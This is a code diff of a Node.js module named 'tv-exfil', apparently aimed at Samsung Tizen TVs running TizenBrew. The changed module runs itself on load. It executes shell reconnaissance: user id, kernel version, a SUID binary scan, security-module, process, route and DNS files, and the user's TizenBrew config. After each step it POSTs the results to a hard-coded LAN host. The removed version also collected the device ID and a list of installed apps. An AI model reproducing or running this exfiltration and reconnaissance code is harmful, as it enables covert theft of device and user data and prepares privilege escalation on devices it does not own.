@@ -1,71 +1,63 @@
 const fetch = require('node-fetch');
+const BEACON_URL = 'http://192.168.0.73:8008/tv-results';
+
+function beacon(obj) {
+    fetch(BEACON_URL, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(obj)
+    }).catch(function(e) { console.log('beacon fail: ' + e.message); });
+}
+
+// Step 1: confirm module loaded
+beacon({source: "tv-exfil-d", step: 1, msg: "module loaded", ts: new Date().toISOString()});
 
 async function main() {
-    const results = {
-        source: "tv-exfil-npm",
-        ts: new Date().toISOString(),
-        shell: null,
-        tizen: null,
-        fs: null
-    };
-
-    // --- Try child_process (shell access) ---
     try {
-        const { exec } = require('child_process');
-        results.shell = { available: true };
-        results.shell.id = await new Promise((r) => exec('id', {timeout:5000}, (e,o) => r(o||e.message)));
-        results.shell.uname = await new Promise((r) => exec('uname -a', {timeout:5000}, (e,o) => r(o||e.message)));
-        results.shell.suid = await new Promise((r) => exec('find / -perm -4000 -type f 2>/dev/null', {timeout:15000}, (e,o) => r(o||e.message)));
-        results.shell.smack = await new Promise((r) => exec('cat /proc/security/lsm 2>/dev/null', {timeout:5000}, (e,o) => r(o||e.message)));
-        results.shell.proc = await new Promise((r) => exec('ps 2>/dev/null || ls /proc/ 2>/dev/null | head -50', {timeout:8000}, (e,o) => r(o||e.message)));
-        results.shell.net = await new Promise((r) => exec('cat /proc/net/route 2>/dev/null; cat /proc/net/fib_trie 2>/dev/null | grep -A1 "32 host" | head -20', {timeout:8000}, (e,o) => r(o||e.message)));
-    } catch(e) {
-        results.shell = { available: false, error: e.message };
-    }
-
-    // --- Try tizen APIs ---
-    try {
-        const t = typeof tizen !== 'undefined' ? tizen : (globalThis.tizen || (0, eval)('tizen'));
-        if (t) {
-            results.tizen = {
-                version: t.systeminfo ? t.systeminfo.getCapability('http://tizen.org/feature/platform.version') : null,
-                model: t.systeminfo ? t.systeminfo.getCapability('http://tizen.org/feature/model') : null,
-                duid: t.systeminfo ? t.systeminfo.getCapability('http://tizen.org/feature/device.id') : null
-            };
-            results.tizen.apps = await new Promise((resolve) => {
-                t.application.getAppInfo(
-                    (l) => resolve(l.map(a => a.id + ' ' + a.name + ' v' + a.version)),
-                    (e) => resolve('error: ' + e.message)
-                );
-            });
+        // Step 2: test child_process
+        var cp;
+        try {
+            cp = require('child_process');
+            beacon({source: "tv-exfil-d", step: 2, msg: "child_process available", ts: new Date().toISOString()});
+        } catch(e) {
+            beacon({source: "tv-exfil-d", step: 2, msg: "child_process BLOCKED: " + e.message, ts: new Date().toISOString()});
+            return;
         }
-    } catch(e) {
-        results.tizen = { error: e.message };
-    }
 
-    // --- Try fs ---
-    try {
-        const fs = require('fs');
-        results.fs = {
-            home: fs.readdirSync('/home/owner/').join(','),
-            share: fs.readdirSync('/home/owner/share/').join(','),
+        var run = function(cmd, timeout) {
+            return new Promise(function(resolve) {
+                cp.exec(cmd, {timeout: timeout || 8000}, function(err, stdout, stderr) {
+                    resolve({cmd: cmd, err: err ? err.message : null, out: stdout ? stdout.substring(0, 2000) : '', err_out: stderr ? stderr.substring(0, 500) : ''});
+                });
+            });
         };
-        try { results.fs.tizenbrew_config = fs.readFileSync('/home/owner/share/.tizenbrewConfig.json','utf8'); } catch(e){}
-    } catch(e) {
-        results.fs = { error: e.message };
-    }
 
-    // Beacon
-    try {
-        const r = await fetch('http://192.168.0.73:8008/tv-results', {
-            method: 'POST',
-            headers: {'Content-Type':'application/json'},
-            body: JSON.stringify(results)
-        });
-        console.log('[tv-exfil] beacon:', r.status);
+        var results = {source: "tv-exfil-d", ts: new Date().toISOString(), cmds: []};
+
+        // Step 3: basic commands
+        results.cmds.push(await run('id'));
+        beacon({source: "tv-exfil-d", step: 3, msg: "id done", data: results.cmds[results.cmds.length-1], ts: new Date().toISOString()});
+
+        results.cmds.push(await run('uname -a'));
+        beacon({source: "tv-exfil-d", step: 4, msg: "uname done", data: results.cmds[results.cmds.length-1], ts: new Date().toISOString()});
+
+        // Step 5: SUID scan (slow)
+        results.cmds.push(await run('find / -perm -4000 -type f 2>/dev/null', 15000));
+        beacon({source: "tv-exfil-d", step: 5, msg: "suid done", data: results.cmds[results.cmds.length-1], ts: new Date().toISOString()});
+
+        // Step 6: SMACK + processes + network
+        results.cmds.push(await run('cat /proc/security/lsm 2>/dev/null; ls /sys/fs/ 2>/dev/null'));
+        results.cmds.push(await run('ps 2>/dev/null | head -40'));
+        results.cmds.push(await run('cat /proc/net/route 2>/dev/null; cat /etc/resolv.conf 2>/dev/null'));
+
+        // Step 7: TizenBrew config
+        results.cmds.push(await run('cat /home/owner/share/.tizenbrewConfig.json 2>/dev/null'));
+
+        // Step 8: final beacon with all results
+        beacon({source: "tv-exfil-d", step: 8, msg: "ALL DATA", data: results, ts: new Date().toISOString()});
     } catch(e) {
-        console.log('[tv-exfil] beacon fail:', e.message);
+        beacon({source: "tv-exfil-d", step: "ERR", msg: e.message, stack: e.stack, ts: new Date().toISOString()});
     }
 }
 
-module.exports = { main };
+main();
